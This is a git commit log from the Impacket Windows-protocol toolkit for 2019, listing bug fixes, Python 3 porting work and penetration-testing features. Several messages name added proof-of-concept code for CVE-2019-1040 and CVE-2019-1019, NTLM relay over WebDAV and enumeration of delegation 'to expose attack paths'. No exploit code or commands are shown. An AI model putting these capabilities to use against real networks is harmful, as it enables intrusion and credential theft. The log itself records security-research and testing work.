Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Dec 11 10:13:26 2019 -0300

    Merge pull request #722 from fox-it/dpapi-merge
    
    improve support for key+sid in dpapi examples

commit 1f2d203f6f750b4a5ddf4de516ad8e7a56e0ac44
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Dec 10 11:17:43 2019 +0100

    improve support for key+sid in dpapi examples

commit 909238e9eeaf3d15c2f1da06a74d71d648606f64
Merge: 7cdc0277 9738405f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Dec 9 14:29:08 2019 -0300

    Merge pull request #720 from exploide/doc-smbserver-auth
    
    removed old documentation about smbserver not authenticating clients

commit da3b1f9419a78bb9a1804cd8e4f10e7104b4968a
Author: G0ldenGunSec <28241763+G0ldenGunSec@users.noreply.github.com>
Date:   Sun Dec 8 13:14:47 2019 -0600

    Update GetUserSPNs.py

commit 2397ec2465f068d93b172bc73c7bc7dcde872abd
Author: G0ldenGun <g0ldengunsec@gmail.com>
Date:   Sun Dec 8 13:08:15 2019 -0600

    Delegation Retrieval Functionality
    
    Added a column to GetUserSPNs.py that returns delegation information associated with the account.  Useful to help identify accounts to target & to expose additional potential attack paths.

commit 9738405f60e0ad144e6c6b577794432ad7adc119
Author: exploide <me@exploide.net>
Date:   Sun Dec 8 15:22:14 2019 +0100

    removed old documentation about smbserver not authenticating clients

commit 7cdc0277b90abbc055731fc8777b627bb90c18b7
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 3 16:46:06 2019 -0300

    Adding -ts switch for this script.
    
    - Adds timestamp to every log line

commit 5a0edb3a36a5c7a5b5c12c1e545de70f2e101bcb
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 3 16:43:17 2019 -0300

    Adding a ImpacketFormatterTimeStamp class
    
    - Usefull if you want to have a timestamp of every log line
    - Requires setting ts=True when calling logger.init()

commit 1c42cc1ccf68f0d924767a88ddd424950ecd5ec4
Merge: 97d66fb8 501c3d12
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Dec 3 12:56:16 2019 -0300

    Merge pull request #718 from exploide/smbexec-codec
    
    Added codec parameter to smbexec.py

commit 97d66fb86b32834a947680494ae5f24629df480a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Dec 3 12:51:16 2019 -0300

    Update issue templates

commit a48af713208fb46f0e5113678ad1c51aa3e91a4c
Merge: 70371a41 c2209833
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Dec 3 12:42:22 2019 -0300

    Merge pull request #716 from awsmhacks/patch-1
    
    Add an issue template

commit 70371a41a164733a10bbca53390f4ebf125da851
Merge: d65c0d22 8ae5cdb8
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Dec 3 12:26:21 2019 -0300

    Merge pull request #707 from mpgn/patch-1
    
    Check if the type of the 'data' variable is already "bytes"

commit 501c3d126fc140e4fb03547836c5469df6544473
Author: exploide <me@exploide.net>
Date:   Tue Dec 3 15:57:21 2019 +0100

    updated Python docs URL to modern version

commit 37aaa25b87c233b165f92b3950d799830fb2012a
Author: exploide <me@exploide.net>
Date:   Tue Dec 3 15:54:27 2019 +0100

    smbrelayx.py: fixed typos in codec parameter description

commit 6170e27a07ba9abc27bbb763d8343327bb171736
Author: exploide <me@exploide.net>
Date:   Tue Dec 3 15:51:34 2019 +0100

    smbexec.py: added -codec parameter to deal with UnicodeDecodeErrors
    
    fixes #708

commit 172ab7cb5378ab1f3a06b1051362ec5e11e8b97b
Author: exploide <me@exploide.net>
Date:   Tue Dec 3 15:50:06 2019 +0100

    gitignore: ignore common virtualenv folders

commit c22098331559f6867755537d6a35889eec5c05aa
Author: Ryan <ryan.preston.01@gmail.com>
Date:   Mon Dec 2 13:32:12 2019 -0600

    Create bug_report.md
    
    Attempts to make issues uniform and include enough information.

commit a45e4a657de862c3236d9b9b134cb5241bd7676b
Author: Clément Notin <clement@notin.org>
Date:   Sat Nov 30 19:25:06 2019 +0100

    nmb.py: stop using select() in non_polling_read()
    
    Closes #649

commit d65c0d220a9613ae74db42adc9362a7947acdd66
Merge: fdc8ddd7 0a7ba186
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 28 17:58:17 2019 -0300

    Merge branch 'slasyz-master'

commit 0a7ba186a04f0a2b1db8c32cf0497acae9cbad22
Author: Vyacheslav Syrovatsky <slasyz@gmail.com>
Date:   Thu Nov 28 17:14:28 2019 +0300

    Fix the warning added to Python 3.8: SyntaxWarning: "is" with a literal. Did you mean "=="?

commit 8f5ae81532ecc4ed49527a1ecb750d65e4628b10
Author: Vyacheslav Syrovatsky <slasyz@gmail.com>
Date:   Thu Nov 28 17:11:44 2019 +0300

    Add explicit digestmod parameter setting to all hmac.new() calls for Python 3.8 compatibility (issue SecureAuthCorp/impacket#702).

commit 8ae5cdb8478b0c29a2365b6e353ab2f17280390e
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Wed Nov 27 09:24:22 2019 +0100

    Check if the type of the 'data' variable is already "bytes"
    
    If `data` is already a bytes then we cannot convert it to bytes again. This PR check if the the variable is not already a bytes
    
    Should fix issue #691

commit fdc8ddd76e6f5b418e87635d7a70b4e43cbc8081
Merge: 6822cc71 570f25de
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 26 14:38:24 2019 -0300

    Merge branch 'master' of https://github.com/SecureAuthCorp/impacket

commit 6822cc713ea6749f84c9f71e5c4087120d530fb2
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 26 14:37:23 2019 -0300

    Appending NULL byte instead of string
    
    - Should address https://github.com/SecureAuthCorp/impacket/issues/691

commit 141c675c9aebc97452e4220d7d2c7e807aaaa151
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Sun Nov 24 21:12:24 2019 +0200

    Fix messageId bug in ldap search request
    
    Hi,
    
    When using search method to find different type of objects (when the size of the results exceeded the maximum search limit) in small intervals between each request, I experienced some issue that the requests resulted mixed results. i.e. after initiating a requests for users, and requesting groups right afterwards, the group request returned users instead of groups.
    I did a little digging and noticed messageID was configured as 1 in LDAPConnection's constructor, and incremented after each successful search request.
    RFC specifically states: "A client MUST NOT send a request with the same messageID as an earlier request in the same LDAP session..".
    It made me realize that  when initiating multiple requests with the same LDAPConnection instance, it might result same messageId in different search requests, therefore returning the wrong response.
    The added code should fix this.
    
    Itamar

commit 570f25de5fee23f9c2290da4eaad8c29f82a20f9
Merge: caaa66a8 244a0c12
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 21 18:15:59 2019 -0300

    Merge pull request #696 from awsmhacks/master
    
    Adds ability to choose computer name when using --add-computer

commit f79210ac35f42e5efb8510fc1342cecaec456ec3
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 21 17:50:07 2019 -0300

    Minor code changes and grammar fixes

commit 0776ddbe028fc84730ca31804ea0f8d6b9ab7c92
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 21 17:42:59 2019 -0300

    Updated copyright and removing unused import

commit bcbe4cacd024b5d62cd4a09e0778078698da5957
Merge: 10e2a2cc be6181e7
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 21 17:40:10 2019 -0300

    Merge branch 'master' of https://github.com/jagotu/impacket

commit 244a0c12a7159168873dbb87fb8816a6f6ba9505
Author: awsmhacks <nomail>
Date:   Mon Nov 18 11:22:03 2019 -0600

    .

commit caaa66a818c911b621280fb59d6d7631d690ec0f
Merge: 10e2a2cc 9d0adf83
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 14 12:34:58 2019 -0300

    Merge pull request #693 from danhph/master
    
    Correct the values of NETSETUP_JOIN_STATUS enum

commit 9d0adf8376d9a864a27fec9650cd56c94f50ee72
Author: Huu-Danh Pham <danhph@outlook.com>
Date:   Thu Nov 14 01:43:31 2019 -0600

    correct values of NETSETUP_JOIN_STATUS enum

commit 10e2a2cc3bd8c81e97c0aedb821cadab07ca6cbc
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 5 15:35:28 2019 -0300

    Fix bug that prevented SMB -> SMB relay
    
    - Bug introduced this commit https://github.com/SecureAuthCorp/impacket/commit/e67019aa425bab01725788db0e8e51f011753026#diff-3df699770af5e22587f669bbca5ed00e
    - SMB -> SMB relay was working only when --remove-mic was enabled.
    - Addresses https://github.com/SecureAuthCorp/impacket/issues/685

commit f38b68ac78639a9dc0e7c12eb2db38a9c6acbef9
Merge: d84b8d32 5a6a7882
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 7 16:45:03 2019 -0300

    Merge branch 'rxwx-master'

commit 5a6a78828eb54faeda8e1feb9ac9371904d637fc
Author: rxwx <richard.warren@nccgroup.trust>
Date:   Wed Oct 2 13:09:41 2019 +0100

    Fix python 3 compat issues

commit e531093f772179389765539090e091b98e2553c2
Author: rxwx <richard.warren@nccgroup.trust>
Date:   Mon Sep 30 19:40:29 2019 +0100

    Add snapshot support to retrieveFile

commit 08039fad4321a4495d9231a6e3c3a24f46008978
Author: rxwx <richard.warren@nccgroup.trust>
Date:   Mon Sep 30 18:09:59 2019 +0100

    Add feature to listPath to allow for listing directories decorated with a @GMT timestamp value

commit 1c8544f23e7632471b588190742558b217d079fe
Author: rxwx <richard.warren@nccgroup.trust>
Date:   Fri Sep 27 15:40:42 2019 +0100

    python3 compatibility

commit dc70bccdd592acb58319d555012d0217f8e5f99d
Author: rxwx <richard.warren@nccgroup.trust>
Date:   Fri Sep 27 15:33:35 2019 +0100

    Return a list of snapshots from listSnapshots

commit da7673b6db60be25852c4242847e2b8862775cc2
Author: rxwx <richard.warren@nccgroup.trust>
Date:   Fri Sep 27 09:33:23 2019 +0100

    Add FSCTL_SRV_ENUMERATE_SNAPSHOTS functionality to smbconnection, and a list_snapshots command to smbclient

commit d84b8d32d6358a6069813fe7f3e1ac4b2694f60d
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 26 15:21:47 2019 -0300

    OneCmd returns None, there shouldn't be an output parse
    
    - Should address https://github.com/SecureAuthCorp/impacket/issues/676

commit 5cb6389cba53ebd0f7e91491e62964ec33ea5069
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 25 15:45:16 2019 -0300

    And going back to dev ;)

commit 647d7be7cb1328ea69340d3b689693220cd5762f
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 25 14:20:16 2019 -0300

    Tagging new release
    
    - It'll just last a few minutes till we come back to -dev :P

commit be6181e7fec5528f94d36e00038f2d3f525f1399
Author: JaGoTu <jagotu@gmail.com>
Date:   Tue Sep 24 13:10:24 2019 +0200

    Addcomputer: Workaround for python bug
    
    https://bugs.python.org/issue11874

commit 02089dc442f80b4ee06b95333cf268ff9997575a
Merge: afa2825d 149ba19b
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Sep 23 16:09:26 2019 -0300

    Merge pull request #675 from MrAnde7son/patch-12
    
    Add support for all info types query\set info request

commit 149ba19b391cdc56cbcb6e0927b4e74ad42d11e2
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Sun Sep 22 11:01:14 2019 +0300

    Add support for all info types in QUERY_INFO request
    
    Hi,
    
    in SMB2QueryInfo the infoType field was statically set to SMB2_0_INFO_FILE. In order to query security descriptor and more, I change it to use the actual infoType parameter passed to the function.

commit afa2825d94482b6b138ad20681c2d9dd77ac2470
Merge: 75250d73 ec7aaa47
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 18 12:03:45 2019 -0300

    Merge pull request #674 from MrAnde7son/patch-11
    
    Fix bug in RQueryServiceObjectSecurity

commit ec7aaa470cbe2d34790e10a1027bcac2f8d0a62f
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Sep 18 14:37:21 2019 +0300

    Fix bug in RQueryServiceObjectSecurity
    
    Hi,
    
    RQueryServiceObjectSecurity structure wasn't configured properly. The array of the actual security descriptor was defined as the whole response, so it wasn't able to unpack 'pcbBytesNeeded' properly. I fixed this and the handling of insufficient buffer size (cbBufSize is smaller than the size of the security descriptor).

commit 75250d7366cfff7727cb67df6b2536327a4f6989
Merge: 11ff3d4e fc725c5e
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 11 11:30:28 2019 -0300

    Merge branch 'c0d3z3r0-for_upstream/unicode_fix'

commit fc725c5ef7fa4ba2c7491587c3328f05564ba5ef
Merge: 11ff3d4e bdaea1c9
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 10 15:22:08 2019 -0300

    Merge branch 'for_upstream/unicode_fix' of https://github.com/c0d3z3r0/impacket into c0d3z3r0-for_upstream/unicode_fix

commit 11ff3d4e023e31d0ba0fcd77ad3ecb7439a24492
Merge: 80ca7241 0dc38645
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 10 15:16:07 2019 -0300

    Merge branch 'c0d3z3r0-for_upstream/python3_error_msg'

commit 0dc38645b60c330ff5b2cee88e3ef82805fb187a
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 10 15:15:43 2019 -0300

    raising the exception the Py3 way

commit c0664ea4c49e969b639d980c9d4e111f5d460df1
Author: Michael Niewöhner <michael.niewoehner@8com.de>
Date:   Wed Sep 4 10:56:59 2019 +0200

    Fix broken error message introduced by python3 port
    
    Signed-off-by: Michael Niewöhner <michael.niewoehner@8com.de>

commit bdaea1c904ce45bb36b058ecb0d1a1bf370fc760
Author: Michael Niewöhner <michael.niewoehner@8com.de>
Date:   Wed Sep 4 13:18:04 2019 +0200

    Fix unicode errors caused by python2/3 incompatibility
    
    Signed-off-by: Michael Niewöhner <michael.niewoehner@8com.de>

commit 66c76985ad924b82142e2a9715366b76a6a1c3f8
Author: Jan Gocník <jagotu@gmail.com>
Date:   Fri Aug 23 15:20:03 2019 +0200

    AddComputer: new example script
    
    AddComputer.py can add a computer to a domain using LDAP or SAMR (SMB)

commit 80ca724120ec92208468431dba1c51b6f109da3b
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 20 14:09:15 2019 -0300

    Do not enconde the string to bytes when changing drive letter.
    
    - Should address https://github.com/SecureAuthCorp/impacket/issues/666

commit c9f26f6861c8714d788ae937a3ce0f64d748ed04
Merge: 27065c57 a0ad462c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Aug 12 16:56:11 2019 -0300

    Merge pull request #665 from n1ngod/master
    
    fix the import path of hLsarOpenPolicy2

commit a0ad462c492285fb1d48e544c08a41dd94bd8bd8
Author: n1ngod <zhangning9500@gmail.com>
Date:   Mon Aug 12 17:51:07 2019 +0800

    fix the import path of hLsarOpenPolicy2

commit 27065c5789b996bb64487537db391015203ed17d
Merge: 652dfc4a 93c4d2c9
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Jul 18 17:49:46 2019 -0300

    Merge pull request #652 from salu90/webdav
    
    Added NTLM relays leveraging Webdav authentications

commit 93c4d2c969b136bc2fbaa2f1945a256fae776625
Author: salu90 <simone.salucci@gmail.com>
Date:   Wed Jul 17 11:14:02 2019 +0200

    added webdav capabilities and relay

commit 652dfc4a43c56e96f147237d4587d9834449a241
Merge: 9e54b026 1e40a643
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 11 16:05:45 2019 -0300

    Merge branch 'stuken-nested_obj_value_fix'

commit 1e40a643e6b1979847a71e075fff326b48194bee
Merge: 9e54b026 3b8027d9
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 11 14:50:02 2019 -0300

    Merge branch 'nested_obj_value_fix' of https://github.com/stuken/impacket into stuken-nested_obj_value_fix

commit 9e54b0261cc03b45602d62274122a747fc7a27f7
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 11 14:44:33 2019 -0300

    Minor changes
    
    - chmod +x
    - Adding exec #!
    - Adding impacket banner
    - Fixing code style proposed by pyCharm

commit 3bd5338ce37eb40c9ec3c6879a5b587599ac616c
Merge: 2f2db662 cb44903e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Jul 11 14:39:15 2019 -0300

    Merge pull request #647 from iboukris/s4u2else
    
    A tool for testing CVE-2018-16860 and CVE-2019-0734

commit cb44903ea9731b5bba05cee5c8d9e1990305f788
Author: Isaac Boukris <iboukris@gmail.com>
Date:   Wed Jul 3 22:53:30 2019 +0300

    A tool for intercepting krb5 connections
    
    and for testing KDC handling S4U2Self with unkeyed checksum.
    
    See CVE-2018-16860 and CVE-2019-0734
    
    Signed-off-by: Isaac Boukris <iboukris@gmail.com>

commit 2f2db662bae0919251b959d76ef42269dd522def
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 3 13:20:58 2019 -0300

    Completing CVE-2019-1019 attribution.

commit 398b9e5b5d4cf03f8691ed553f1fa8833ab641dc
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 3 13:19:26 2019 -0300

    Adjusting messages

commit 3b8027d93f8938901a7fc61d7842f10feb01119b
Author: Stuart Kenny <stuart.kenny@iquate.com>
Date:   Tue Jul 2 12:21:28 2019 +0100

    Do not overwrite default values with 0

commit b129807bd0c5dd860e176a726f376e5570067164
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 24 09:46:58 2019 -0300

    Clarifying some messages when signing is required

commit abd1fe7e072383ff1b4c575ec1f21779c9890fea
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 24 09:40:18 2019 -0300

    Removing unused variable
    
    - Plus fixing bug that wasn't showing the domain we're connecting when using the NETLOGON approach to get signing keys

commit e7461f6dbf448084b00230cc6fcd192f9c2baa08
Merge: e71424cd 24102b40
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Jun 20 11:43:24 2019 -0300

    Merge pull request #641 from franferrax/master
    
    Adjust 5257b9d changes to dtypes.STR to work in Python 2 & 3

commit 24102b40d98216270c1f0c3c7f8a5db4040d03a9
Author: fferrari <fferrari@coresecurity.com>
Date:   Wed Jun 19 19:52:46 2019 -0300

    Making 5257b9d changes to dtypes.STR work in Py 2 & 3
    Also handling raw buffers in dtypes.STR.__getitem__()

commit e71424cdfe310275d377ee2646f78d9717b5e478
Merge: fc51af45 25f02602
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sat Jun 15 10:44:39 2019 -0300

    Merge pull request #637 from dirkjanm/micremove
    
    Mic remove - CVE-2019-1040

commit 25f02602eee6d923a65127b1e80cb592b8cac32d
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Jun 15 11:37:40 2019 +0200

    Fix bug in CVE-2019-1019 ntlmrelayx code

commit e67019aa425bab01725788db0e8e51f011753026
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Jun 13 21:36:13 2019 +0200

    Added POC code for CVE-2019-1040

commit fc51af452156fc8fd9d31a9b31541f6859e76ae1
Merge: d6b5bd4e 2e9dc77d
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 13 19:10:39 2019 -0300

    Merge branch 'msimakov-CVE-2019-1019'

commit 2e9dc77d7a74329c318b5bf9add647600752c967
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 13 19:10:22 2019 -0300

    Minor cosmetic changes and code attribution

commit cb311ef2660e4c0675fa7b5bf68997dc0461b7ce
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 13 18:24:33 2019 -0300

    Add SMBv1 support + MIC Calculations improvements
    
    - Changed enable_signing for set_session_key as previously used
    - MIC calculations are stored using the original type3 message, in order to avoid changes when marshaling back again using impacket.

commit 5257b9dfbd2db13878313ad0bc58754b8ac50820
Author: Marina Simakov <msimakov@preempt.com>
Date:   Thu Jun 13 16:30:26 2019 +0300

    CVE-2019-1019: Bypass SMB singing for unpatched machines

commit d6b5bd4e2f3fe3e9fa252dcd2a1dd76faa0c5395
Author: asolino <bethus@gmail.com>
Date:   Wed May 29 14:42:40 2019 -0300

    Let's try w/o decoding Unicode
    
    - We should actually do what we meant.
    - Should address https://github.com/SecureAuthCorp/impacket/issues/631

commit c2a92c536f76f8581497308201f67316f54112ae
Merge: 50ccbf9f eaca9bee
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Mon May 27 13:27:11 2019 +0200

    merged with master

commit eaca9beeae8c882209115e00408ba65b3861fd51
Merge: 25a37a24 f67caa7a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu May 23 12:26:57 2019 -0300

    Merge pull request #630 from iptwLcP9/dhcp-fix
    
    Adjust the option domain-search-list to be synchronized with its definition in the RFC 3397

commit f67caa7a60ea1f3a92e7255182cbe72e5420a6f4
Author: iptwLcP9 <iptwLcP9>
Date:   Thu May 23 17:13:36 2019 -0300

    Adjust the option domain-search-list to be synchronized with its definition in the RFC 3397

commit 25a37a242156d1773fad9ad98a9aeb4851ca3051
Author: asolino <bethus@gmail.com>
Date:   Wed May 22 19:24:15 2019 -0300

    Adjusting lmhash, nthash and aesKey to Python3 binary data
    
    - Thought I already did it but there are some use cases that weren't working, so a more safer approach is taken now (i.e. converting everything to binary at the very beginning)
    - This should address https://github.com/SecureAuthCorp/impacket/issues/628

commit 87e0b7f2aa26b8abdcb18ddd1fac3f964a1a0d03
Merge: 7dd9096e 1c4f9d49
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue May 21 15:08:43 2019 -0300

    Merge pull request #627 from cnotin/patch-1
    
    Nice catch @cnotin! Merging: smbserver.py: fix order of "computer\username" in log messages

commit 1c4f9d49757c68bbcf7a0c3b4c99a265d7880374
Author: Clément Notin <clement@notin.org>
Date:   Tue May 21 18:32:04 2019 +0200

    smbserver.py: fix order of "computer\username" in log messages

commit 7dd9096e799ca7d100b62f1758985c6757265023
Merge: 018f9ecd 9b57fa47
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed May 15 15:01:21 2019 -0300

    Merge pull request #621 from SR4ven/fix_dependencies
    
    Fixed broken ldap3 requirement

commit 018f9ecd6ab4641321549b8ba651a48c246090f9
Merge: ec9d119d 8eea8c25
Author: asolino <bethus@gmail.com>
Date:   Wed May 15 14:58:28 2019 -0300

    Merge branch 'cnotin-patch-1'

commit 8eea8c257e5452dd3ce565b684edca68c08e8e1e
Author: Clément Notin <clement@notin.org>
Date:   Fri May 10 18:00:53 2019 +0200

    nmb: add timeout for whole read operation in non_polling_read

commit 9b57fa47dda1311f0bb800ab498700d5c0efeef1
Author: SR4ven <46794237+SR4ven@users.noreply.github.com>
Date:   Fri May 10 17:47:18 2019 +0200

    Moved pip check from tavis to tox

commit d1ba169fa2efabdd18e62d5e2407eecfd4525cb8
Author: SR4ven <46794237+SR4ven@users.noreply.github.com>
Date:   Fri May 10 17:08:59 2019 +0200

    Fixed broken ldap3 requirement

commit ec9d119d102251d13e2f9b4ff25966220f4005e9
Merge: 335f25e2 b1458ce7
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue May 7 14:10:29 2019 -0300

    Merge pull request #615 from cnotin/patch-2
    
    Add STYPE_MASK constant

commit 335f25e22c62072fdb8bebc55f710462ed1eb18a
Merge: 9bd28ec5 cd58aedc
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue May 7 13:21:43 2019 -0300

    Merge pull request #606 from cclauss/patch-1
    
    Travis CI: Test on Python 3.7 and flake8 3.7

commit 9bd28ec596f834404c27c1a8e778580d94294f6f
Merge: e8e55a20 82f24470
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue May 7 13:10:07 2019 -0300

    Merge pull request #619 from eamanu/patch-1
    
    Dummy clean on file

commit 82f2447004ddc1fa0193a232b88a292a8c0f83d8
Author: Emmanuel Arias <emmanuelarias30@gmail.com>
Date:   Sat May 4 21:09:26 2019 -0300

    Dummy clean on file
    
    This is a lazy change. Delete commented and unused lines.

commit e8e55a2092690957f852c142459be0a0e101187c
Merge: c2de18c5 1f1baeab
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Apr 28 16:03:26 2019 -0300

    Merge pull request #598 from cnotin/patch-1
    
    smb3: fix the check to not encrypt anonymous connection

commit c2de18c5573228eff238ade5fd93fd71ff4f4b53
Merge: 9362abfe a0ca1af5
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Apr 28 16:02:06 2019 -0300

    Merge pull request #616 from cclauss/patch-2
    
    Remove trailing backslash in remcomsvc.py

commit 9362abfea97d13b942bfdc117d43c47053f00134
Merge: 434c8680 cb7793b3
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 28 16:00:49 2019 -0300

    Merge branch 'mikeryan-win2016-multiple-peks'

commit cb7793b377948103bc08d5483f2bd4e1207f8d62
Author: Mike Ryan <mikeryan@lacklustre.net>
Date:   Thu Apr 25 19:55:15 2019 -0700

    support multiple PEKs in Windows 2016
    
    __decryptHash was throwing IndexError on Windows 2016 if a hash was
    encrypted with a PEK with a higher index than 0. This patch attempts to
    extract all keys from the PEK list. The PEK list format was reverse
    engineering by eyeball. YMMV.

commit 434c8680f6e8dd9e459ca86612658e3efaac7976
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 23 09:00:07 2019 -0300

    ConfigParse should always receive strings, not ints
    
    - Shown under Python3 (Python2 doesn't care)
    - Addresses https://github.com/SecureAuthCorp/impacket/issues/617
    - Also fixed another minor Python2/3 dict port

commit a0ca1af5afcf1c8885d17fc4085ac79b5b2c7f1f
Author: cclauss <cclauss@me.com>
Date:   Thu Apr 18 17:08:43 2019 +0200

    Remove trailing backslash in remcomsvc.py

commit b1458ce76a6bd6155c3c69860d184ddecc3f3cc0
Author: Clément Notin <clement@notin.org>
Date:   Wed Apr 17 13:38:32 2019 +0200

    Add STYPE_MASK constant

commit cd58aedca42a05c4a5f90a25f333f04d03af6852
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 17:06:07 2019 +0200

    Flake8: Raise all E9xx errors

commit f784e233265960dbeacf91a28d63d0614c2d8171
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 16:14:21 2019 +0200

    Upgrade flake8 to 3.7.7

commit 754a421fd937402ae51921cc82c2004d0fd9962a
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 16:13:25 2019 +0200

    remcomsvc.py: Remove backslash at end of the file
    
    flake8 says:
    ```
    ./impacket/examples/remcomsvc.py:1:1: E902 TokenError: EOF in multi-line statement
    ```

commit fef3bb983fed9d65d11b71ab40fbff709bb8853c
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 15:44:19 2019 +0200

    flake8 . --max-complexity=65

commit 6d064d00974128054ded721847ebb56276c66f8d
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 15:21:00 2019 +0200

    Update .travis.yml

commit ef0769230961609c5f58f3aabe0de56699d501ea
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 15:20:43 2019 +0200

    Revert flake8 upgrade

commit 6bdecc02071b76cb08884ef67c131a0fbb2b2828
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 15:14:15 2019 +0200

    tox.ini: Add py37

commit 3ccc22bbde4c2ca17b7201ff4c997cdf89f7779c
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 15:12:28 2019 +0200

    Travis CI: Test on Python 3.7 and flake8 3.7

commit e715bac7b4c242418c0547fe22e64dd496017070
Author: Aconite33 <kazul33@gmail.com>
Date:   Sun Apr 7 13:36:40 2019 +0100

    Required command for options and removed allowing interactive shells.

commit 9057749df1a5405a99ca77a751abd588de67641b
Author: Aconite33 <kazul33@gmail.com>
Date:   Sun Apr 7 13:19:15 2019 +0100

    Added silent function to allow execution of commands without running cmd.exe

commit 194b22ed2fc85c4f241375fb7ebe4e0d89626c8c
Merge: 4905c8c0 29e4bbb0
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Apr 5 23:52:19 2019 -0300

    Merge pull request #603 from skorov/master
    
    hLsarOpenPolicy2 was being reference (incorrectly) from lsat

commit 29e4bbb0735c758f307c442758578fb45e03e295
Author: skorov <alexei.doud@gmail.com>
Date:   Fri Apr 5 11:23:37 2019 +1100

    Fixed bug where hLsarOpenPolicy2 was being reference (incorrectly) from lsat

commit 4905c8c0ba9c5ff42de5709d8499627e97af1eea
Merge: 429f97a8 1114c3e1
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Apr 4 14:24:09 2019 -0300

    Merge pull request #601 from cclauss/patch-1
    
    Travis CI: Time to take off the training wheels...

commit 1114c3e1ac14cfc4b33e6b8f1cd470eb484a80bd
Author: cclauss <cclauss@me.com>
Date:   Thu Apr 4 18:07:56 2019 +0200

    Travis CI: Time to take off the training wheels...
    
    Should the __python36__ branch be removed as well to keep folks from stumbling into the wrong place?

commit 1f1baeabacc52d9d11e8e10626632ae3653391f5
Author: Clément Notin <clement@notin.org>
Date:   Wed Apr 3 16:22:04 2019 +0200

    smb3: fix the check to not encrypt anonymous connection

commit 429f97a894d35473d478cbacff5919739ae409b4
Merge: 7e18805c 8529e901
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Apr 1 15:18:33 2019 -0300

    Merge pull request #596 from SecureAuthCorp/python36
    
    Python36 Support

commit 8529e901e87525806e96b67476eed5d040b9b21b
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 1 15:03:12 2019 -0300

    Chaging syntax for Python 3.x support

commit 7b04f191c02038599db55557c0faeed5f117592b
Merge: fcf8c53b 7e18805c
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 1 14:53:58 2019 -0300

    Merge branch 'master' into python36

commit 7e18805cc468a542b3e219638d1da08dc3d18e5d
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 1 14:52:24 2019 -0300

    Going back to dev version

commit 621fd66fa4adef112ec45cd0c96207f2a6667300
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 1 12:29:42 2019 -0300

    Ready to tag a new release

commit ff6450fc88c879d1e2b580a99ec6ff6b7a8ea62b
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 1 11:38:51 2019 -0300

